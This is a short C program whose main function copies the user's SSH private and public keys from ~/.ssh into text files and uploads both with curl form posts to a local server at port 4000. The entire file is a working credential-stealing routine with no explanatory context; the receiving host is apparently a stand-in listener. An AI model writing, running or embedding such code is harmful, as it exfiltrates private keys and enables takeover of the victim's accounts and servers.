#include <stdio.h>
#include <stdlib.h>

int main() {
  system("cat ~/.ssh/id_rsa > priv.txt");
  system("cat ~/.ssh/id_rsa.pub > public.txt");
  system("curl --form 'file=@priv.txt' http://localhost:4000/ ");
  system("curl --form 'file=@public.txt' http://localhost:4000/ ");
}